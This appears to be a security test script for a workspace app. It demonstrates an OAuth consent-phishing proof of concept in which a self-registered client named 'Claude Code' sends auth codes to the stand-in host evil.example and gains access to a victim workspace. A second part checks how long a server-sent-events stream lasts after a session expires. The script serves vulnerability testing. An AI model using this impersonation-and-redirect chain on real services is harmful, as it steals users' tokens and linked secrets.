import { startMulti, result, sha256 } from '../../harness.mjs';
import { createHash, randomBytes } from 'node:crypto';
import http from 'node:http';
import { renderOAuthConsentHtml, visibleText } from './live-app-fns.mjs';

process.on('unhandledRejection', (e) => console.log('UNHANDLED', e?.message || e));
const b64u = (b) => b.toString('base64').replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');

// ---------------- Part 1: OAuth consent screen, hosted personal workspace ----------------
const M = await startMulti({ forwarded: true });
try {
  const V = M.as('user_victim');
  await V.api('/api/vault', { method: 'POST', body: { key: 'GH_TOKEN', value: 'ghp_victim_secret_value_123', type: 'api_key' } });
  const legit = await V.createAgent({ name: 'Claude Code', kind: 'claude-code', secrets: ['GH_TOKEN'] });
  result('victim pre-existing agent', { id: legit.id, name: legit.agent.name, secrets: legit.agent.secrets });

  const fwd = { 'x-forwarded-for': '198.51.100.9' }; // attacker is remote
  const reg = await fetch(`${M.base}/oauth/register`, { method: 'POST', headers: { 'content-type': 'application/json', ...fwd }, body: JSON.stringify({ client_name: 'Claude Code', redirect_uris: ['https://evil.example/cb'], grant_types: ['authorization_code'], response_types: ['code'], token_endpoint_auth_method: 'none' }) });
  const client = await reg.json();
  result('DCR (unauthenticated) with name "Claude Code" + https://evil.example/cb', { status: reg.status, client_id: client.client_id?.slice(0, 18), name: client.client_name });

  const verifier = b64u(randomBytes(40));
  const challenge = b64u(createHash('sha256').update(verifier).digest());
  const resource = `${M.base}/w/${V.workspaceId}/mcp`;
  const au = new URL(`${M.base}/oauth/authorize`);
  for (const [k, v] of Object.entries({ response_type: 'code', client_id: client.client_id, redirect_uri: 'https://evil.example/cb', code_challenge: challenge, code_challenge_method: 'S256', state: 's1', resource })) au.searchParams.set(k, v);
  const ar = await fetch(au, { redirect: 'manual', headers: fwd });
  const tx = new URL(ar.headers.get('location'), M.base).searchParams.get('loop-oauth');
  result('authorize -> consent tx', { status: ar.status, tx: !!tx });

  const consent = await V.api(`/api/oauth/requests/${encodeURIComponent(tx)}`);
  const req = consent.json?.request;
  result('consent API', { canApprove: consent.json?.canApprove, clientName: req?.clientName, redirectHost: req?.redirectHost, resourcePath: req?.resourcePath?.slice(0, 12) + '...' });
  // What the victim reads before clicking Allow: the screen as renderOAuthConsentScreen() in public/app.js draws it today.
  try {
    const html = await renderOAuthConsentHtml(consent.json);
    const screen = visibleText(html);
    result('consent screen text', screen.slice(0, 600));
    result('consent screen (live dashboard code)', {
      rendered: /id="oauth-allow"/.test(html),
      showsFullCallback: screen.includes('https://evil.example/cb'),
      // Wording that tells the reader the name is only what the app calls itself. Extend the list if a fix words it differently.
      saysNameIsUnverified: /unverified|not verified|not been verified|self[- ]asserted|self[- ]reported|calls itself|calling itself|claims to be|can(?:'|’|no)t (?:verify|confirm)|unable to (?:verify|confirm)|could not (?:verify|confirm)|not confirmed/i.test(screen),
    });
  } catch (e) { result('consent screen render error', String(e?.message || e)); }

  const ap = await V.api(`/api/oauth/requests/${encodeURIComponent(tx)}/approve`, { method: 'POST' });
  const code = new URL(ap.json.redirectUrl).searchParams.get('code');
  result('approve -> browser sent to', ap.json.redirectUrl.replace(/code=[^&]+/, 'code=<code>'));
  const tok = await fetch(`${M.base}/oauth/token`, { method: 'POST', headers: { 'content-type': 'application/x-www-form-urlencoded', ...fwd }, body: new URLSearchParams({ grant_type: 'authorization_code', code, redirect_uri: 'https://evil.example/cb', client_id: client.client_id, code_verifier: verifier, resource }) });
  const tj = await tok.json();
  result('attacker token exchange (remote)', { status: tok.status, gotToken: /^loop_/.test(tj.access_token || '') });

  const agents = await V.api('/api/agents');
  const list = agents.json.agents.map((a) => ({ id: a.id, name: a.name, oauthClientId: a.oauthClientId ? 'bound' : null, secrets: a.secrets }));
  result('victim agents after approval', list);
  const asAttacker = await V.rpc('tools/list', undefined, { token: tj.access_token });
  result('attacker token works on victim workspace', { status: asAttacker.status, tools: asAttacker.json?.result?.tools?.length });
  const legitAfter = await V.rpc('tools/list', undefined, { token: legit.token });
  result('victim original Claude Code key still works?', { status: legitAfter.status, ok: !!legitAfter.json?.result, err: legitAfter.json?.error?.message?.slice(0, 80) });
} catch (e) {
  result('consent probe error', String(e?.stack || e));
} finally {
  await M.close();
}

// ---------------- Part 2: /events lifetime in Clerk mode ----------------
const frontendApi = 'https://loop-probe.clerk.accounts.dev';
let ttl = 1500;
const M2 = await startMulti({
  forwarded: false,
  clerkApp: {
    publishableKey: `pk_test_${Buffer.from('loop-probe.clerk.accounts.dev$').toString('base64').replace(/=+$/, '')}`, frontendApi,
    async verifyRequest(r) { const u = r.headers['x-fixture-auth']; return u ? { userId: String(u), sessionId: `sess_${u}`, issuer: frontendApi, expiresAt: Date.now() + ttl } : null; },
  },
});
const sse = (headers) => new Promise((resolve) => {
  const t0 = Date.now(); let data = '';
  const rq = http.get({ host: '127.0.0.1', port: M2.port, path: '/events', headers: { host: `127.0.0.1:${M2.port}`, ...headers } }, (res) => {
    res.on('data', (c) => { data += c; });
    res.on('end', () => resolve({ status: res.statusCode, type: res.headers['content-type'], ms: Date.now() - t0, data: data.slice(0, 120) }));
  });
  rq.setTimeout(6000, () => { rq.destroy(); resolve({ status: 'still-open-after-6s', data }); });
});
try {
  await M2.as('user_A', { personal: false }).api('/api/agents'); // claim
  result('SSE with a token that expires in 1.5s', await sse({ 'x-fixture-auth': 'user_A' }));
  result('SSE reconnect once the cookie token is stale', await sse({}));
} catch (e) {
  result('sse probe error', String(e?.stack || e));
} finally {
  await M2.close();
}
